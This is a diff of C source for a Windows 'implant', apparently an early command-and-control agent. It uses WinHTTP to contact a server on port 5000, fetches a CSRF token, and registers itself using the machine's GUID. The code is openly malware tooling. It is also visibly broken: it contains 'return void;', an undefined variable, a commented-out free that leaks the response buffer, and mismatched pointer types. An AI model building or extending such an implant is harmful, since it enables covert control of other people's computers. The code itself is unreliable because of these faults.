@@ -34,7 +34,7 @@ pb_ostream_t ReadyRegisterImplantToSend(uint8_t *buffer, RegisterImplant ri) {
 	return stream;
 }
 
-int SentToServer(LPCWSTR VERB, LPCWSTR PATH, uint8_t *buffer, pb_ostream_t stream) {
+LPSTR SentToServer(LPCWSTR VERB, LPCWSTR PATH, uint8_t *buffer, pb_ostream_t stream) {
 
         // Initialize WinHTTP and send the request
         HINTERNET hSession = WinHttpOpen(L"A Custom User Agent",
@@ -48,12 +48,6 @@ int SentToServer(LPCWSTR VERB, LPCWSTR PATH, uint8_t *buffer, pb_ostream_t strea
                         SERVER_NAME,
                         5000,
                         0);
-
-
-        // LPCWSTR POST_VERB = L"POST";
-        // LPCWSTR GET_VERB = L"GET";
-        // LPCWSTR API_PATH = L"/register";
-        // LPCWSTR REQUEST_CSRF_PATH = L"/get_csrf";
 
         HINTERNET hRequest = WinHttpOpenRequest(hConnect,
                         VERB,
@@ -104,29 +98,42 @@ int SentToServer(LPCWSTR VERB, LPCWSTR PATH, uint8_t *buffer, pb_ostream_t strea
                                                         dwSize,
                                                         &dwDownloaded)) {
                                         printf("Error %lu in WinHttpReadData.\n", GetLastError());
+					
                                 } else {
                                         printf("Server response: %s\n", responseBuffer);
                                 }
 
                                 // Free the memory allocated to the buffer
-                                free(responseBuffer);
+                                // free(responseBuffer);
                         }
                 } while (dwSize > 0);
-        }
+
+		// Clean up
+		WinHttpCloseHandle(hRequest);
+		WinHttpCloseHandle(hConnect);
+		WinHttpCloseHandle(hSession);
+        
+		return responseBuffer;
+	}
 
         // Clean up
         WinHttpCloseHandle(hRequest);
         WinHttpCloseHandle(hConnect);
         WinHttpCloseHandle(hSession);
 
-	return 0;
+	return void;
 }
 
-/**
-void GetCSRFToken() {
-	int status = SentToServer(GET_VERB, CSRF_PATH, buffer, stream);
+LPSTR CSRFToken;
+
+int GetCSRFToken() {
+	uint8_t buffer[4096];
+	pb_ostream_t stream = pb_ostream_from_buffer(buffer, sizeof(buffer));
+	uint8_t *response = SentToServer(GET_VERB, CSRF_PATH, buffer, stream);
+	CSRFToken = response;
+	printf("NEW CSRF TOKEN = %s\n", CSRFToken);
+	return status;
 }
-**/
 
 // Function to set the ImplantID using the machine's GUID
 void ReadMachineGUID() {
@@ -176,14 +183,25 @@ int RegisterSelf() {
 
 int main() {
 	DEBUG_PRINTF("Starting Implant.\n");
-
-	BOOL RegisterResult = RegisterSelf();
 	
-	if (!RegisterResult) {
-		DEBUG_PRINTF("Failed to Register with the server!\n");
+	
+	BOOL result = GetCSRFToken();
+	
+	if (!result) {
+                DEBUG_PRINTF("Failed to get CSRF token from the Server!\n");
+                return 1;
+        }
+        printf("Successfully recieved CSRF token from Server\n");
+
+	
+	result = RegisterSelf();
+
+	if (!result) {
+		DEBUG_PRINTF("Failed to Register with the Server!\n");
 		return 1;
 	}
-	printf("Successfully registered impalnt with implant!\n");
+	printf("Successfully registered implant with Server!\n");
+	
 	return 0;
 }
 
